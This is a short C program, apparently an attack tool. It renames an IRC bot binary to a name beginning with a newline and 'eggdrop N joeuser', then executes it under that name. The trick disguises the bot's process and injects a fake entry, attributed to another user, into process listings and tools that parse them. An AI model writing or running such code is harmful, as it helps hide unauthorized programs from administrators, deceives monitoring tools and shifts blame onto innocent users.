#include <stdio.h>

main(int argc, char *argv[])
{
	char *av[2];
	char haha[128];
	char *origfile = "./ircbot";

	sprintf(haha, "\neggdrop %d joeuser", argv[1] ? atoi(argv[1]) : 1);
	haha[sizeof(haha) - 1] = 0;
	if(argc > 2)
		origfile = argv[2];
	if(rename(origfile, haha) < 0) {
		perror("rename");
		exit(1);
	}
	av[0] = haha;
	av[1] = NULL;
	if(execve(haha, av, NULL) < 0) {
		perror("execve");
		exit(1);
	}
}
